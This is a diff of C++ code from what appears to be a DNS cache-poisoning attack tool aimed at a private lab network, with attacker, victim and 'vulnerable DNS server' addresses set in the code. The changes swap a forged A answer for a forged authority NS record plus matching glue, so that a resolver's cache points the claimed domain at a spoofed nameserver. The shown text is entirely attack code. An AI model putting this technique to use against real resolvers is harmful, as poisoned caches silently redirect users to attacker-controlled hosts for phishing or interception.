@@ -9,9 +9,9 @@ std::uniform_int_distribution<int> uni(1025, 65000); //
 
 
 // We should know attackers IP (No I dont want to use system ip that runs this code directly)
-std::string attackersip = "192.168.0.131";
+std::string attackersip = "192.168.0.132";
 // Attacker should set up smt to welcome victim
-std::string targetip = "192.168.0.130";
+std::string targetip = "192.168.0.132";
 // Vulnerable DNS Server
 std::string targetdns = "192.168.0.129";
 // Authoritative upper level one
@@ -104,31 +104,31 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 		resp_pkt.rfind_pdu<DNS>().add_query( { sarcasm, DNS::A, DNS::IN } );
 
 		// build answers record field
-		DNS::Resource resp_field;
-		resp_field.dname(sarcasm);
-		resp_field.ttl(ttl_val);
-		resp_field.type(DNS::A);
-		resp_field.query_class(DNS::IN);
-		resp_field.data(targetip);
+		// DNS::Resource resp_field;
+		// resp_field.dname(sarcasm);
+		// resp_field.ttl(ttl_val);
+		// resp_field.type(DNS::A);
+		// resp_field.query_class(DNS::IN);
+		// resp_field.data(targetip);
 
-		resp_pkt.rfind_pdu<DNS>().add_answer( resp_field );
+		// resp_pkt.rfind_pdu<DNS>().add_answer( resp_field );
 
 
 		//build authoritative record field
 
-		// DNS::Resource authority_field;
-		// authority_field.dname(basedomain);
-		// authority_field.ttl(ttl_val);
-		// authority_field.type(DNS::NS);
-		// authority_field.query_class(DNS::IN);
-		// authority_field.data(spoof_dns);
+		DNS::Resource authority_field;
+		authority_field.dname(claim_domain);
+		authority_field.ttl(ttl_val);
+		authority_field.type(DNS::NS);
+		authority_field.query_class(DNS::IN);
+		authority_field.data(spoof_dns);
 
-		// resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
+		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
 
 
 		// Additional field
 		DNS::Resource faker_field;
-		faker_field.dname(claim_domain);
+		faker_field.dname(spoof_dns);
 		faker_field.ttl(ttl_val);
 		faker_field.type(DNS::A);
 		faker_field.query_class(DNS::IN);
